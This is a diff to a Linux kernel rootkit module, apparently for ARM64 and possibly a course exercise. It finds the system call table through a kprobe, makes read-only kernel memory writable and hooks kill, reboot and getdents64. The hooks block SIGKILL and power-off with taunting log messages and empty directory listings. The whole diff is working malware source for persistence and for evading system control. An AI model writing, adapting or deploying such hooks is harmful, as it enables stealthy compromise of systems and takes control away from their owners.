@@ -12,6 +12,7 @@
 #include <linux/kallsyms.h>
 #include <linux/kprobes.h>
 #include <asm/pgtable.h>
+#include <linux/reboot.h>
 
 #include "rootkit.h"
 
@@ -32,7 +33,12 @@ static unsigned long *__sys_call_table;
 static void (*update_mapping_prot)(unsigned long, unsigned long, unsigned long, unsigned long);
 static unsigned long start_rodata;
 static unsigned long init_begin;
-static unsigned long section_size = 0x1000;
+#define section_size (init_begin - start_rodata)
+
+typedef asmlinkage unsigned long (*orgin_syscall)(const struct pt_regs *);
+static orgin_syscall orig_kill;
+static orgin_syscall orig_reboot;
+static orgin_syscall orig_getdents64;
 
 static struct kprobe kp = {
 	.symbol_name = "kallsyms_lookup_name",
@@ -41,11 +47,12 @@ static struct kprobe kp = {
 static unsigned long *get_syscall_table(void)
 {
 	unsigned long *syscall_table;
-	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-	kallsyms_lookup_name_t kallsyms_lookup_name;
+	typedef unsigned long (*kallsyms_name)(const char *name);
+	kallsyms_name kallsyms_lookup_name;
 	register_kprobe(&kp);
-	kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
+	kallsyms_lookup_name = (kallsyms_name)kp.addr;
 	unregister_kprobe(&kp);
+
 	syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
 	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
 	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
@@ -53,23 +60,60 @@ static unsigned long *get_syscall_table(void)
 
 	printk(KERN_INFO "sys_call_table at %p\n", syscall_table);
 	printk(KERN_INFO "update_mapping_prot at %p\n", update_mapping_prot);
-	printk(KERN_INFO "start_rodata at %p\n", (void *)start_rodata);
-	printk(KERN_INFO "init_begin at %p\n", (void *)init_begin);
-
+	printk(KERN_INFO "start_rodata: %lx\n", start_rodata);
+	printk(KERN_INFO "init_begin: %lx\n", init_begin);
+	printk(KERN_INFO "section_size: %lx\n", section_size);
 	return syscall_table;
 }
 
-// update_mapping_prot
+// hook reboot
+static asmlinkage int hook_reboot(const struct pt_regs *regs)
+{
+
+	unsigned int cmd = (unsigned int)regs->regs[2];
+
+	if (cmd == LINUX_REBOOT_CMD_POWER_OFF)
+	{
+		printk(KERN_INFO "Power off failed. Hahahaha!\n");
+		return 0;
+	}
+
+	return orig_reboot(regs);
+}
+
+// hook kill
+static asmlinkage int hook_kill(const struct pt_regs *regs)
+{
+	// pid_t pid = (pid_t)regs->regs[0];
+	int sig = (int)regs->regs[1];
+
+	if (sig == SIGKILL)
+	{
+		printk(KERN_INFO "Kill signal failed. Hahahaha!\n");
+		return 0;
+	}
+
+	return orig_kill(regs);
+}
+
+// hook getdents64
+static asmlinkage int hook_getdents(const struct pt_regs *regs)
+{
+
+	return 0;
+}
+
 static inline void protect_memory(void)
 {
-	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
-						section_size, pgprot_val(PAGE_KERNEL_RO)); // RO是指reaonly
+	// physical address of the start of the rodata section
+	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, pgprot_val(PAGE_KERNEL_RO));
+	printk(KERN_INFO "Protected\n");
 }
 
 static inline void unprotect_memory(void)
 {
-	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
-						section_size, pgprot_val(PAGE_KERNEL)); // 將指定範圍的記憶體設置為可讀寫權限
+	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, pgprot_val(PAGE_KERNEL));
+	printk(KERN_INFO "Unprotected\n");
 }
 //-----------------------------------------------------------------------------------
 
@@ -93,6 +137,31 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 	{
 	case IOCTL_MOD_HOOK:
 	{
+		__sys_call_table = get_syscall_table();
+		if (!__sys_call_table)
+		{
+			printk(KERN_INFO "Failed to get system call table\n");
+			break;
+		}
+
+		// print __NR_xxxx number
+		printk(KERN_INFO "kill: %d\n", __NR_kill);
+		printk(KERN_INFO "reboot: %d\n", __NR_reboot);
+		printk(KERN_INFO "getdents64: %d\n", __NR_getdents64);
+		orig_kill = (orgin_syscall)__sys_call_table[__NR_kill];
+		orig_reboot = (orgin_syscall)__sys_call_table[__NR_reboot];
+		orig_getdents64 = (orgin_syscall)__sys_call_table[__NR_getdents64];
+
+		// hook the sys call
+		unprotect_memory();
+
+		__sys_call_table[__NR_kill] = (unsigned long)&hook_kill;
+		__sys_call_table[__NR_reboot] = (unsigned long)&hook_reboot;
+		__sys_call_table[__NR_getdents64] = (unsigned long)&hook_getdents;
+
+		protect_memory();
+
+		break;
 	}
 	case IOCTL_MOD_HIDE:
 	{
@@ -224,7 +293,13 @@ static int __init rootkit_init(void)
 static void __exit rootkit_exit(void)
 {
 	// TODO: unhook syscall
-	unregister_kprobe(&kp);
+	unprotect_memory();
+
+	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+	__sys_call_table[__NR_reboot] = (unsigned long)orig_reboot;
+	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+
+	protect_memory();
 
 	pr_info("%s: removed\n", OURMODNAME);
 	cdev_del(kernel_cdev);
